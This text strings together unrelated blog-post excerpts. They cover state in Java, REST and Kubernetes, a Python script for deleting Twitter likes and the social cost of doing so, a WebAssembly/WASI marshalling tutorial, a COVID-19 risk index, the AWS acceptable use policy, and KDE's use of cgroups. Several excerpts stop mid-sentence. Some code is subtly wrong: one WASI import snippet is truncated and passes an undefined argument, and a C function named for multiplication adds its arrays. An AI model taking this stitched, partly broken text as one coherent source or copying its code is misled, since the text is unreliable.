    <span>if</span> <span>(</span><span>cache</span> <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>int</span> <span>result</span> <span>=</span> <span>value</span> <span>*</span> <span>factor</span><span>;</span>
      <span>results</span><span>.</span><span>put</span><span>(</span><span>value</span><span>,</span> <span>result</span><span>);</span>
      <span>return</span> <span>result</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>return</span> <span>cache</span><span>;</span>
    <span>}</span>
  <span>}</span>
<span>}</span></code></pre> </div> </div> <p>The above implementation is <em>immutable</em>: state is set once when the object is created, and cannot be changed afterwards. Successive calls with the same argument will return the same result over and over. Yet, the method has side-effects.</p> <p>To keep most of the system <em>pure</em>, practitioners of <abbr title="Functional Programming">FP</abbr> push non-pure functions to the system boundaries.</p> </div> </div> <div> <h2 id="state-in-web-architectures">State in web architectures</h2> <div> <p>The HTTP protocol is stateless. The benefit is obvious: when a request hits the load-balancer, the latter can forward it to any web server that belongs to the cluster, and that hosts the requested resource. This allows for <a href="https://en.wikipedia.org/wiki/Scalability#Horizontal_or_Scale_Out" target="_blank" rel="noopener">horizontal scaling</a>. When the load increases, it’s straightforward to add more nodes until the performance becomes acceptable again. It works like a charm, until the requirement goes beyond just displaying static pages.</p> <p>In reality, a lot of use-cases require different HTTP requests to be recognized as originating from the same "session": authentication, e-commerce caddies, etc. <a href="https://en.wikipedia.org/wiki/HTTP_cookie" target="_blank" rel="noopener">Cookies</a> are the browsers' answer to those requirements.</p> <p>Servers do offer a generic storage mechanism, keyed to a session identifier. On the first request, the server adds a cookie with a specific session id to the response. Subsequent requests will use this cookie, so the server associates the request with the same session. Different servers have different cookies: <code>JSESSIONID</code> for Java EE, <code>PHPSESSID</code> for PHP, <code>ASPSESSIONID</code> for ASP, etc.</p> <p>Data stored on a specific cluster node won’t obviously be accessible to requests forwarded to other nodes, even when they originate from the same session. To avoid that, sessions needs to be "pinned down" on the node that received the first request for that session. In standard web architectures, this is one of the responsibility of the load-balancer: it keeps the association between a session id and the node in memory. This feature is known as <em>sticky sessions</em>.</p> <p>However, nodes will sometimes fail. If session data is on that node, it will be lost. To compensate for that, data needs to be replicated on other nodes. That capability is known as <em>session replication</em>.</p> <p>Sticky sessions, and even more so sessions replication, make architectures stateful.</p> </div> </div> <div> <h2 id="state-in-rest-architectures">State in REST architectures</h2> <div>  <ol><li><span>Client-server architecture</span></li><li><span>Statelessness</span></li><li><span>Cacheability</span></li><li><span>Layered system</span></li><li><span>Uniform interface</span></li></ol> <p>Note that #2 explicitly defines <a href="https://en.wikipedia.org/wiki/Representational_state_transfer#Statelessness" target="_blank" rel="noopener">statelessness</a> as a requirement of the REST architecture. However, the definition of it in this context is not the absence of state, but that state shouldn’t be stored server-side.</p> <div> <blockquote> <p>The client-server communication is constrained by no client context being stored on the server between requests. Each request from any client contains all the information necessary to service the request, and the session state is held in the client. The session state can be transferred by the server to another service such as a database to maintain a persistent state for a period and allow authentication.</p> </blockquote> </div> <p>The quote above defines two options to store data:</p> <div> <dl> <dt>In a database</dt> <dd> <p>Storing data is the <em>raison d’être</em> for databases, whether SQL or NoSQL. Hence, it seems like an obvious choice to store state. However, this generally implies <em>disk-based persistence</em>. In turn, this means increased access time to data, 2 or 3 orders of magnitude higher than for in-memory access.</p> </dd> <dt>On the client</dt> <dd> <p>Another option is to store data as cookies. This approach raises some interesting challenges on its own: the first one is about security. If credentials-related data is stored client-side, then how can the server guarantees they are genuine? The currently agreed-upon answer is <a href="https://jwt.io/" target="_blank" rel="noopener">JSON Web Tokens</a>. One just needs to remember it makes the flow more complex, and slower, because validation still needs to occur server-side, prior to any further request handling.</p> <p>The second challenge revolves around data serialization. Simple types <em>e.g.</em> <code>int</code> or <code>String</code> can easily be set in cookie values, but what about more complex types? It would require an serialization/deserialization mechanism: when the request is received, cookies should be deserialized into objects, and when the response is sent, objects should be serialized back into a compatible format <em>e.g.</em> JSON.</p> <p>The complete setup is worth a dedicated post, but here are some points that deserve some attention:</p> <ul><li><span>How to manage serialization limitations?</span></li><li><span>The need to automate the serialization/deserialization flow</span></li><li><span>Configure the entities to be serialized, and decide which JSON library to use</span></li></ul> </dd> </dl> </div> </div> </div> <div> <h2 id="state-in-kubernetes">State in Kubernetes</h2> <div> <p>First, one should remember that Kubernetes was originally focused on stateless workloads. For example, <code>StatefulSet</code> was introduced in version 1.5 as a beta feature. Furthermore, rolling upgrades of the <code>Deployment</code> object handle pods only. If containerized applications use a database, and software require different schema versions, you’re on your own: while possible, <a href="https://www.youtube.com/watch?v=RvCnrBZ0DPY" target="_blank" rel="noopener">it’s not trivial</a>.</p> <p>Apart from that, Kubernetes offers some interesting options to manage state:</p> <div> <dl> <dt>Inside the container</dt> <dd> <p>The easiest way to store data is to use the container’s topmost layer.

	<div>
		
<p>A while ago I decided to delete my ‘like’ history on Twitter.</p>



<p>Since then, I’ve discovered interesting ways in which Twitter’s engineering makes it impossible to do.</p>



<p>The recent ones are easy, if you have access to the <a href="https://developer.twitter.com/en/docs/basics/getting-started" target="_blank" rel="noreferrer noopener">Twitter API</a>. You can request the list of ‘favorites’ (they never renamed them to ‘likes’ on the API layer) and from there you can <a href="https://developer.twitter.com/en/docs/tweets/post-and-engage/api-reference/post-favorites-destroy" target="_blank" rel="noreferrer noopener">delete them</a>, one at a time.</p>



<pre><code lang="python">#!/usr/bin/env python3
import os
import twitter

api = twitter.Api(
    os.environ['CONSUMER_KEY'], os.environ['CONSUMER_SECRET'],
    os.environ['ACCESS_TOKEN_KEY'], os.environ['ACCESS_TOKEN_SECRET'],
    sleep_on_rate_limit=True
)
while True:
    favorites = api.GetFavorites(count=200)
    if not favorites:
        break
    print(f"GetFavorites(): Received {len(favorites)} status objects.")
    for status in favorites:
        print(f"{status.user.screen_name:20}: {status.text}")
        status = api.DestroyFavorite(status_id=status.id)
</code></pre>



<p>From the looks of things, you can delete the most recent 3,000 or so ‘likes’ you’ve ever made using a script like this.</p>



<p>After that, things get harder.</p>



<hr>



<p>I’ve been thinking about what a ‘like’ on Twitter and Facebook means.</p>



<p>When you click it, you’re sending a single piece of information to the person who wrote the tweet. Ostensibly, I guess, that you liked their tweet. Really it’s just read-receipt for Twitter — you’re just telling someone that you read what they wrote. If you’re mentioned in a tweet it seems almost <em>fait accompli</em> that you’re going to hit ‘like’. It means “yeah yeah, I got your message”, and not much else.</p>



<p>After that, it just sits there, in your history, and in Twitter’s database. It becomes part of their algorithm to tune your feed to keep you hooked.</p>



<hr>



<p>Once you’ve deleted all the ‘likes’ that the API will allow you to see, you’ll find, to your surprise, that there are still thousands to go. They show up on your ‘likes’ page, and they show up in your exported data archive, but the little red ‘heart’ isn’t active.</p>



<p>I guess these ‘likes’ are in some sort of static cold storage. I’d be fascinated to hear from a Twitter engineer (a) how it works, and (b) why they still work for Twitter.</p>



<p>You can’t delete them, the platform doesn’t treat them as ‘liked’ tweets at all.</p>



<p>The only way to get rid of them is to is to click the heart twice: to ‘like’ it anew and then ‘unlike’ it. This sends the author  and anyone mentioned a fresh notification telling them that you liked their tweet.</p>



<p>If you want to delete your old history of tweets. You’re going to have to send a new notification to every single person in every single tweet you’ve ever liked. Thousands upon thousands of them. For tweets that can be years old.</p>



<hr>



<p>I like it when people like my tweets. I come up with witty, snarky things to say so that people click ‘like’. I want to write more of them. It keeps me coming up with ‘tweetable’ things to say.</p>



<p>At its most cynical, “like” is the endorphin button: Every time you like someone’s tweet you’re sending them a tiny little burst of pleasure that keeps them addicted to Twitter.</p>



<p>The sad thing is, the better you <em>are</em> at twitter — the better you are at pithy, wry sarcasm in short form — the more effective you are at keeping everyone else addicted to an intentionally-addictive platform.</p>



<p>We all are each other’s drug pushers.</p>



<hr>



<p>The only way someone won’t get a notification when you “like” their tweet is if (a) they don’t follow you, and (b) you set your account to ‘private’ mode first.</p>



<p>To get an exhaustive list of the tweets you’ve liked, you have to download your Twitter “data archive”, a <code>.zip</code> file of all data Twitter keeps on you (that they want to admit to). In the <code>date/like.js</code> file is the list of all the likes, along with their ID numbers.</p>



<p>This would be enough to use the API to ‘like’ and ‘unlike’ each tweet, but if you want to reduce the disruption to others you need to take more steps.</p>



<p>I used the Twitter API to retrieve the full details of every Tweet in the list so that I could group them by author and by accounts mentioned in the Tweet. I ended up writing some unreasonable amount of Python and SQLAlchemy code to correlate them all.</p>



<p>My plan was to group the operations so that I could (a) prevent notifications to strangers by being in ‘private mode’ whenever I was running my program, and (b) when it came time to disrupt my friends’ by sending them notifications, I’d try to group them all so it all happened at once instead of spread out over interminable days of hundreds of notifications.</p>



<p>It <em>would</em> be hundreds, after all: your likes are pretty proportional to the tweets you see. The tweets you see most tend to be the friends you’ve followed the longest.</p>



<p>I started working my way through the list. A couple of times a day the routine was:</p>



<ul><li>set my twitter profile to ‘protected mode’</li><li>start my script. Watch it chug through ‘liking’ and ‘unliking’ a stream of tweets</li><li>crash when the rate limit was hit</li><li>reset my Twitter profile to ‘public’ mode</li><li>wait a couple hours, and repeat</li></ul>



<p>For friends of mine who’s tweets I’d liked *hundreds* of times, I either <strong>blocked</strong> them first so they wouldn’t get notifications (knowing I could unblock them afterwards, and invite them to re-follow me), or I tried to message them first to warn them that I was about to spam them.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><div lang="en" dir="ltr"><p>Dear friends, over the next several days you're likely to see every tweet of yours I've ever "liked" get a fresh "like" notification — even years-old ones.</p><p>They're all good tweets.</p></div>— Tom Eastman (@tveastman) <a href="https://twitter.com/tveastman/status/1260676895328198656?ref_src=twsrc%5Etfw">May 13, 2020</a></blockquote>
</div></figure>



<p>For the people who get scores-to-hundreds of notifications, having this tweet pinned on the top of my profile would at least give them some explanation as to what the hell was happening.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><p lang="en" dir="ltr">OKAY, THIS MAKES MORE SENSE NOW</p>— Dr Sophia Frentz 🌈 (@SophiaFrentz) <a href="https://twitter.com/SophiaFrentz/status/1261194791729020933?ref_src=twsrc%5Etfw">May 15, 2020</a></blockquote>
</div></figure>



<p>It definitely weirded people the hell out though. Some of my friends politely removed me till it was done.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><p lang="en" dir="ltr"><a href="https://twitter.com/tveastman?ref_src=twsrc%5Etfw">@tveastman</a> muting u my friend.

</div></figure>



<p>I also accidentally re-started conversation threads left hanging years previously, thanks to the fresh notification on an old tweet.</p>



<figure><div>
<blockquote data-width="525" data-dnt="true"><p lang="en" dir="ltr">Lol Tom Necro, also HTTP/3 is almost here which doesnt even use TCP</p>— Beau Butler (@oddynz) <a href="https://twitter.com/oddynz/status/1261228701947068416?ref_src=twsrc%5Etfw">May 15, 2020</a></blockquote>
</div></figure>



<p>But finally, after about two weeks of running the script at least once a day until rate-limited, I had finally deleted all my likes. Finally, I had a clean slate.</p>



<p>Only, I didn’t.</p>



<figure><img src="https://tom.eastman.nz/wp-content/uploads/2020/06/completionists-gonna.png" alt="" srcset="https://tom.eastman.nz/wp-content/uploads/2020/06/completionists-gonna.png 609w, https://tom.eastman.nz/wp-content/uploads/2020/06/completionists-gonna-340x243.png 340w" sizes="(max-width: 609px) 100vw, 609px"><figcaption>Completionists gonna have a hard time with this</figcaption></figure>



<p>You can’t delete a like on an old tweet without ‘liking’ the tweet again.</p>



<p>It turns out that there are plenty of tweets old tweets you might have hit ‘like’ on once, but you can’t see any more.</p>



<p>Tweets from deleted or suspended accounts <em>remain</em> in the count even if they’re not visible by the system. Tweets by people who you don’t follow who have protected their accounts are inaccessible.</p>



<p>Tweets that you liked, by Twitter users who have subsequently blocked you, can never, ever by removed by you.</p>



<p>And so, at the end of the day, I can no longer see my liked tweets, but maybe you can. And some of the tweets will be people who no longer follow me, and some of them — there forever — will be from people who loath me.</p>



<hr>



<p>What was the point of all this?</p>



<p>When it became obvious that I wasn’t going to be able to delete my like history without sending thousands of notifications. I decided to press on with the project because I wanted to see exactly what social cost Twitter would exact upon me, just for trying to reclaim my own data.</p>



<p>I didn’t measure how many people unfollowed me, but I certainly got some bewildered reactions. I had friends reach out to me out-of-band to ask me if my account had been hacked.</p>



<p>And for all that, it turned out to be un-completable. Twitter will not allow you the means to completely wipe your “like” history short of actually deleting your account.</p>



<p>‘Likes’ might not seem important. But it’s critical to the sorts of algorithms social media use to tune their feeds to keep you hooked, and to target you with advertising. They’re also a paltry, lazy mode of communication. From now on, if I like someone’s tweet, I’ll conjure the mental effort to at least tell them so, with words.</p>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    

<p>In this series of posts I’ve done a lot of experimentation. An element which
I’ve had to implement a number of times is calling functions defined in a
WebAssembly module.</p>

<p>Calling a WebAssembly function involves transferring data to an instance,
calling a function, and retrieving the results. This is known as marshalling.</p>

<p>The source code for the examples can be found
<a href="https://github.com/rob-blackbourn/example-wasi-marshalling">here</a>
and the marshalling package
<a href="https://github.com/rob-blackbourn/jetblack-wasi-marshalling">here</a>.</p>

<h2 id="our-first-c-function">Our First C Function</h2>

<p>Here is an example function written in C and compiled to WebAssembly.</p>

<pre><code>__attribute__((used)) double* multipleFloat64ArraysReturningPtr (
    double* array1,
    double* array2, 
    int length)
{
  double* result = (double*) malloc(length * sizeof(double));
  if (result == 0)
    return 0;

  for (int i = 0; i &lt; length; ++i) {
    result[i] = array1[i] + array2[i];
  }

  return result;
}
</code></pre>

<p>At the highest level the function takes two floating point arrays which it
multiplies and returns the result. At a lower level, two pointers to double
arrays are passed with a length. A result pointer is allocated with the required
length in which the result is stored. Finally the pointer to the result array
is returned.</p>

<p>To make this happen, first memory has to be allocated for the two input arrays
in the WebAssembly module. The data must then be copied into the arrays. When
the function is called it creates a third array by allocating space in the
WebAssembly. The pointer to this memory is then returned. The JavaScript must
copy the result array, then free the two input arrays and the result array.</p>

<h2 id="our-first-javascript-prototype">Our First JavaScript Prototype</h2>

<p>I’ve written a package to simplify the marshalling of data between JavaScript
and WebAssembly. Here is how to create a binding for the function.</p>

<div><div><pre><code><span>const</span> <span>proto</span> <span>=</span> <span>new</span> <span>FunctionPrototype</span><span>(</span>
    <span>[</span>
        <span>new</span> <span>In</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
        <span>new</span> <span>In</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
        <span>new</span> <span>In</span><span>(</span><span>new</span> <span>Int32Type</span><span>())</span>
    <span>],</span>
    <span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>(),</span> <span>4</span><span>))</span>
</code></pre></div></div>

<p>This matches the <code>C</code> prototype.</p>

<pre><code>__attribute__((used)) double* multipleFloat64ArraysReturningPtr (
    double* array1,
    double* array2, 
    int length)
</code></pre>

<p>Note that the return type also declares the length of the returned array. The
<code>C</code> function will only return a pointer to the start of the array, so we need
the length. In the real world we’d probably make a function out of prototypes
that require length parameters.</p>

<p>We can invoke the function as follows.</p>

<div><div><pre><code><span>const</span> <span>result</span> <span>=</span> <span>proto</span><span>.</span><span>invoke</span><span>(</span>
  <span>wasi</span><span>.</span><span>memoryManager</span><span>,</span>
  <span>wasi</span><span>.</span><span>instance</span><span>.</span><span>exports</span><span>.</span><span>multipleFloat64ArraysReturningPtr</span><span>,</span>
  <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>],</span>
  <span>[</span><span>5</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>],</span>
  <span>4</span><span>)</span>
</code></pre></div></div>

<p>As well as the function arguments we provide <code>wasi.memoryManager</code> to allow
access to the WebAssembly memory and <code>wasi.instance</code> to retirve the function.</p>

<p>When the function is invoked three things happen. First the input arguments are
<em>marshalled</em>. Memory is allocated for each array, and the array data is copied
into that memory. The integer value can be passed directly.</p>

<p>Second the function is called with the marshalled aruments and the return value
is received.</p>

<p>Third the memory for the input arguments is freed, the result value is copied
from the WebAssembly memory to a JavaScript array, and the memory that was
allocated inside the WebAssembly instance is freed.</p>

<h2 id="memory">Memory</h2>

<p>While not strictly part of WASI, memory management is the first problem to
solve. When a WebAssembly module is instatiated a memory buffer is either
passed, or created by the instance. When using the WASM standard library
provided by <a href="https://github.com/WebAssembly/wasi-libc">wasi-libc</a> the memory
management functions <code>malloc</code> and <code>free</code> can be exported from the instance.</p>

<p>After instantiation they are held in the following class.</p>

<div><div><pre><code><span>class</span> <span>MemoryManager</span> <span>{</span>
  <span>constructor</span> <span>(</span><span>memory</span><span>,</span> <span>malloc</span><span>,</span> <span>free</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span><span>memory</span> <span>=</span> <span>memory</span>
    <span>this</span><span>.</span><span>malloc</span> <span>=</span> <span>malloc</span>
    <span>this</span><span>.</span><span>free</span> <span>=</span> <span>free</span>
    <span>this</span><span>.</span><span>dataView</span> <span>=</span> <span>new</span> <span>DataView</span><span>(</span><span>this</span><span>.</span><span>memory</span><span>.</span><span>buffer</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>An array of floats might be marshalled as follows.</p>

<div><div><pre><code><span>function</span> <span>marshallFloat64Array</span><span>(</span><span>memoryManager</span><span>,</span> <span>array</span><span>)</span> <span>{</span>
  <span>const</span> <span>address</span> <span>=</span> <span>memoryManager</span><span>.</span><span>malloc</span><span>(</span><span>Float64Array</span><span>.</span><span>BYTES_PER_ELEMENT</span> <span>*</span> <span>array</span><span>.</span><span>length</span><span>)</span>
  <span>const</span> <span>typedArray</span> <span>=</span> <span>new</span> <span>Float64Array</span><span>(</span><span>memoryManager</span><span>.</span><span>memory</span><span>.</span><span>buffer</span><span>,</span> <span>address</span><span>,</span> <span>array</span><span>.</span><span>length</span><span>)</span>
  <span>typedArray</span><span>.</span><span>set</span><span>(</span><span>array</span><span>)</span>
  <span>return</span> <span>address</span>
<span>}</span>
</code></pre></div></div>

<p>An array that was allocated inside the WebAssembly instance might be
unmarshalled as follows.</p>

<div><div><pre><code><span>function</span> <span>unmarshallFloat64Array</span><span>(</span><span>memoryManager</span><span>,</span> <span>address</span><span>,</span> <span>length</span><span>)</span> <span>{</span>
  <span>try</span> <span>{</span>
    <span>const</span> <span>typedArray</span> <span>=</span> <span>new</span> <span>Float64Array</span><span>(</span><span>memoryManager</span><span>.</span><span>memory</span><span>.</span><span>buffer</span><span>,</span> <span>address</span><span>,</span> <span>length</span><span>)</span>
    <span>return</span> <span>Array</span><span>.</span><span>from</span><span>(</span><span>typedArray</span><span>)</span>
  <span>}</span> <span>finally</span> <span>{</span>
    <span>memoryManager</span><span>.</span><span>free</span><span>(</span><span>address</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<h2 id="our-second-c-function">Our Second C Function</h2>

<p>Here is our second <code>C</code> function.</p>

<pre><code>__attribute__((used)) void multipleFloat64ArraysWithOutputArray (double* array1, double* array2, double* result, int length)
{
  for (int i = 0; i &lt; length; ++i) {
    result[i] = array1[i] + array2[i];
  }
}
</code></pre>

<p>This time the calling function allocates the memory for the output array and
passes it in.</p>

<h2 id="our-second-javascript-function-prototype">Our Second JavaScript Function Prototype</h2>

<p>The JvaScript function prototype looks as follows.</p>

<div><div><pre><code><span>const</span> <span>proto2</span> <span>=</span> <span>new</span> <span>FunctionPrototype</span><span>(</span>
  <span>[</span>
    <span>new</span> <span>In</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
    <span>new</span> <span>In</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
    <span>new</span> <span>Out</span><span>(</span><span>new</span> <span>ArrayType</span><span>(</span><span>new</span> <span>Float64Type</span><span>())),</span>
    <span>new</span> <span>In</span><span>(</span><span>new</span> <span>Int32Type</span><span>())</span>
  <span>]</span>
<span>)</span>
</code></pre></div></div>

<p>We don’t need to provide a return type as nothing is returned. The <em>output</em>
argument is wrapped in an <code>Out</code> class to inform the marshaller to unpack it
after the function is called.</p>

<p>The function is called as follows.</p>

<div><div><pre><code><span>const</span> <span>output</span> <span>=</span> <span>new</span> <span>Array</span><span>(</span><span>4</span><span>)</span>
<span>proto2</span><span>.</span><span>invoke</span><span>(</span>
  <span>wasi</span><span>.</span><span>memoryManager</span><span>,</span>
  <span>wasi</span><span>.</span><span>instance</span><span>.</span><span>exports</span><span>.</span><span>multipleFloat64ArraysWithOutputArray</span><span>,</span>
  <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>],</span>
  <span>[</span><span>5</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>],</span>
  <span>output</span><span>,</span>
  <span>4</span><span>)</span>
</code></pre></div></div>

<p>Because we supplied the output array with the correct length, we didn’t need
to supply a length argument to <code>ArrayType</code>.</p>

<h2 id="wheres-wasi">Where’s WASI?</h2>

<p>So far there’s been no need for WASI. That ends with strings.</p>

<p>WASI enters the picture when we need to leave the WebAssembly sandbox and
interact with the system in which we’re running. It’s not obvious why this
should happen with strings. In JavaSCript strings use UTF-8. As soon
as we need to decode a string the C standard library will want to know about
our <em>locale</em> (our language environment). To do this it it checks the environment
variables, which exist outside the sandbox!</p>

<p>This introduces the first of our system call requirement: <code>environ_sizes_get</code>
and <code>environ_get</code>. The first call finds the amount of space required to store
the environment variables; the second fetches them.</p>

<p>The other need for WASI is when the code interacts with stdout/stderr. While
we might think this is unnecessary, it is common for C libraries to report
errors through the <code>perror</code> function which returns and error and reports the
cause to stderr.</p>

<p>There are a small bunch of functions we need to support here. The final outcode
is the following set of imports to the WebAssembly.</p>

<div><div><pre><code><span>const</span> <span>res</span> <span>=</span> <span>await</span> <span>WebAssembly</span><span>.</span><span>instantiate</span><span>(</span><span>buf</span><span>,</span> <span>{</span>

    <span>fd_write</span><span>:</span> <span>(</span><span>fd</span><span>,</span> <span>iovs</span><span>,</span> <span>iovsLen</span><span>,</span> <span>nwritten</span><span>)</span> <span>=&gt;</span> <span>wasi</span><span>.</span><span>fd_write</span><span>(</span><span>fd</span><span>,</span> <span>iovs</span><span>,</span> <span>iovsLen</span><span>,</span> <span>ritten</span><span>),</span>

    <span>}</span>
<span>})</span>
</code></pre></div></div>

<p>With this relatively small set of imports we can import the vast majority of
publically available C libraries.</p>

<h2 id="strings--stdoutstderr">Strings &amp; Stdout/Stderr</h2>

<p>You can check out the source code fore the implementations and use of these.
They are not typically use from JavaScript, and are only provided to allow
imported C libarries to run.</p>

<h2 id="thoughts">Thoughts</h2>

<p>We’ve got a ganeric marshalling layer between JavaScript and WebAssembly which
is pretty cool! We’ve also got enough WASI to drop in publically available
<code>C</code> libraries.</p>

<p>We’ve not yet addressed C++ libraries and we’re waiting for the <code>flang</code> compiler
to be incorporated into the <code>llvm</code> toolchain, so there’s a way to go before we
have access to everything we need to use JavaSCript to do real work with
native libraries.</p>

	With no clear direction from the federal government on how to handle the COVID-19 pandemic, it’s been hard to decide what’s safe and unsafe as states begin to open up. There's no right answer; you just need to know the risks and how much risk you're willing to take. That's why Professor Saskia Popescu, an infectious disease epidemiologist at the University of Arizona,&nbsp;Dr. James P. Phillips, MD, the Chief of Disaster Medicine at GWU Emergency Medicine, and I developed a COVID-19 Risk Index to help you do this, based on four key factors:</p>
<p>
	1) Enclosed space</p>
<p>
	2) Duration of interaction</p>
<p>
	3) Crowds</p>
<p>
	4) Forceful exhalation&nbsp; &nbsp;</p>
<p>
	Again, we hope this Risk Index is helpful to you as you decide what you are comfortable doing as these activities become available. We created this as a public service, so please feel free to tweet, post, e-mail, and print and hang this on your refrigerator&nbsp;or around your workplace. You can download the infographic <a href="https://www.dropbox.com/s/t2ecgl0wur1kyzp/COVID-19%20risk%20infographic_final.pdf?dl=0">here</a></p>

I actually quite like AWS and its offerings. I’m making this post because I’m genuinely curious
how to interpret the <a href="https://aws.amazon.com/aup/">AWS Acceptable Use Policy</a>. The static content for this blog is hosted within an
AWS S3 bucket. Does saying “Fuck You AWS” constitute offensive content?</p>

<p>The section titled ‘No Illegal, Harmful, or Offensive Use or Content’ says:</p>

<blockquote>
  <p>You may not use, or encourage, promote, facilitate or instruct others to use, the Services or AWS Site for any illegal, harmful, fraudulent, infringing or offensive use, or to transmit, store, display, distribute or otherwise make available content that is illegal, harmful, fraudulent, infringing or offensive. Prohibited activities or content include:</p>
</blockquote>

<blockquote>
  <p>Offensive Content. Content that is defamatory, obscene, abusive, invasive of privacy, or otherwise objectionable, including content that constitutes child pornography, relates to bestiality, or depicts non-consensual sex acts.</p>
</blockquote>

<p>“Otherwise objectionable” seems to cast a very wide net.
One of my <a href="http://thoughts.josephdeon.me/2020/07/01/hello-weblog.html">three goals</a> for self hosting this blog was ownership. To me part of
ownership is being able to express myself freely. I hoped that meant as
long as I worked within the confines of the law I would be in the clear.</p>

<p>If this post gets removed then I know I have not fully achieved my ownership goal and it
might be time to just host on a pi.</p>

<p><br>
P.S. I posted this to hackernews. It made it to the front page and generated <a href="https://news.ycombinator.com/item?id=23717254">some discussion</a>.</p>

	<div>
		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png" alt=""></a></p>
<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
